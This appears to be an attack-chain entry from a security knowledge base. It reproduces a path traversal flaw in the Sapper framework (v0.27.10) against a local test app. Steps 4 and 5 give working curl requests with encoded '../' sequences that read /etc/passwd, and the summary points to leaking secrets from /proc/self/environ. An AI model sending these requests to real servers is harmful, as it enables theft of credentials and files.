---
tags:
  - path-traversal
  - sapper
  - node.js
  - file-disclosure
  - rce
type: attack_chain
tools:
  - '[[tools/git]]'
  - '[[tools/npm]]'
  - '[[tools/npx]]'
  - '[[tools/degit]]'
  - '[[tools/sapper]]'
  - '[[tools/curl]]'
  - '[[tools/node]]'
  - '[[tools/polka]]'
tactics:
  - '[[Initial Access]]'
  - '[[Execution]]'
verified: false
platforms:
  - Web
  - Linux
  - Node.js
submitted: true
complexity: medium
created_at: '2023-10-01T00:00:00Z'
procedures:
  - '[[procedures/Clone-Sapper-Template-Project]]'
  - '[[procedures/Install-Sapper-Dependencies]]'
  - '[[procedures/Obtain-Webpack-Sapper-Example]]'
  - '[[procedures/Exploit-Path-Traversal-in-Development-Mode]]'
  - '[[procedures/Exploit-Path-Traversal-in-Production-Mode]]'
step_count: 5
techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[File and Directory Discovery]]'
updated_at: '2025-12-14T17:26:11.592Z'
description: >-
  Multi-stage attack chain exploiting path traversal in Sapper framework's
  static file serving to access and read arbitrary files on the server,
  potentially leading to exposure of sensitive data and full infrastructure
  compromise.
skill_level: intermediate
impact_level: high
id: 205bb58f-a0c3-4d4e-9ede-6942c5086435
validated: true
mitre_tactics:
  - '[[Initial Access]]'
  - '[[Execution]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[File and Directory Discovery]]'
---
---

# Sapper Framework Path Traversal for Arbitrary File Read

Multi-stage attack chain demonstrating a complete attack workflow exploiting path traversal in the Sapper framework to read arbitrary files like /etc/passwd, exposing sensitive data such as API keys and enabling potential RCE.

## Chain Metrics Dashboard

| Metric | Value |
|--------|-------|
| Chain Status | Unverified |
| Total Steps | 5 |
| Execution Time | ~10 minutes |
| Skill Level | Intermediate |
| Complexity | Medium |
| Impact Level | High |

## Attack Flow Visualization

```mermaid
graph LR
    A[Setup Project] --> B[Install Dependencies]
    B --> C[Obtain Webpack Example]
    C --> D[Exploit in Dev Mode]
    D --> E[Exploit in Prod Mode]

    style A fill:#e74c3c
    style B fill:#f39c12
    style C fill:#f39c12
    style D fill:#3498db
    style E fill:#27ae60
```

## Prerequisites & Requirements

### Required Tools

- [[tools/git]]
- [[tools/npm]]
- [[tools/npx]]
- [[tools/degit]]
- [[tools/sapper]]
- [[tools/curl]]
- [[tools/node]]

### Target Environment

- Node.js v10.19.0 or compatible
- NPM 6.13.4
- Linux server for file access testing (/etc/passwd)
- Local machine with internet access for cloning repositories

### Initial Access Requirements

- No prior credentials needed; assumes access to a vulnerable Sapper app (v0.27.10)
- Local network access to run dev/prod server on port 3000
- Ability to send HTTP requests to localhost:3000

## Detailed Attack Procedures

### Step 1: Project Setup
procedure: [[procedures/Clone-Sapper-Template-Project]]

**Objective**: Clone the base Sapper project to establish the vulnerable environment.

**Instructions**: Use [[commands/git-clone-sapper-template]] to download the Sapper template from GitHub:

```bash
git clone https://github.com/sveltejs/sapper-template
```

**Expected Output**: A new directory 'sapper-template' containing the base project files.

**Success Indicators**:
- Repository cloned successfully without errors
- Project directory created with src/ and package.json present

### Step 2: Dependency Installation
procedure: [[procedures/Install-Sapper-Dependencies]]

**Objective**: Install required packages, including the vulnerable Sapper version 0.27.10.

**Instructions**: Navigate to the cloned directory and run [[commands/npm-install-dependencies]]:

```bash
cd sapper-template
npm i
```

**Expected Output**: Packages downloaded and installed, node_modules directory created.

**Success Indicators**:
- No installation errors
- Sapper 0.27.10 listed in node_modules

### Step 3: Webpack Example Acquisition
procedure: [[procedures/Obtain-Webpack-Sapper-Example]]

**Objective**: Obtain the Webpack-integrated Sapper template for the vulnerable stack.

**Instructions**: From the project root, execute [[commands/npx-degit-webpack-example]] to shallow clone the Webpack branch:

```bash
npx degit "sveltejs/sapper-template#webpack" my-app
```

**Expected Output**: 'my-app' directory created with Webpack configuration files.

**Success Indicators**:
- New 'my-app' directory populated
- Webpack-related files like webpack.config.js present

### Step 4: Development Mode Exploitation
procedure: [[procedures/Exploit-Path-Traversal-in-Development-Mode]]

**Objective**: Start the dev server and exploit path traversal using single-encoded '../' to read /etc/passwd.

**Instructions**: In the 'my-app' directory, start the server with [[commands/npx-sapper-dev]]:

```bash
npx sapper dev
```

In a new terminal, send the exploit request using [[commands/curl-dev-path-traversal]]:

```bash
curl -vv http://localhost:3000/client/750af05c3a69ddc6073a/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd
```

**Expected Output**: HTTP response containing contents of /etc/passwd.

**Success Indicators**:
- Server running on http://localhost:3000
- File contents returned in response body

### Step 5: Production Mode Exploitation
procedure: [[procedures/Exploit-Path-Traversal-in-Production-Mode]]

**Objective**: Build and run the production server, then exploit using double-encoded '../' due to Polka's decoding.

**Instructions**: Build the project and start the prod server with [[commands/npx-sapper-build-and-run]]:

```bash
npx sapper build && node __sapper__build
```

Send the double-encoded exploit using [[commands/curl-prod-path-traversal]]:

```bash
curl -vvv http://localhost:3000/client/750af05c3a69ddc6073a/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/etc/passwd
```

**Expected Output**: HTTP response with /etc/passwd contents.

**Success Indicators**:
- Production server started on http://localhost:3000
- Arbitrary file read successful despite extra decoding

## Attack Chain Summary

### Key Achievements

1. Setup of vulnerable Sapper environment with Webpack integration
2. Exploitation of path traversal in dev mode for file disclosure
3. Adaptation to production mode using double encoding for persistent access
4. Potential exposure of API keys from /proc/self/environ leading to RCE

## Technique & Tactic Coverage

### MITRE ATT&CK Techniques

- [[Exploit Public-Facing Application]]
- [[File and Directory Discovery]]

### MITRE ATT&CK Tactics

- [[Initial Access]]
- [[Execution]]

---

*Last updated: 2023-10-01T00:00:00Z*
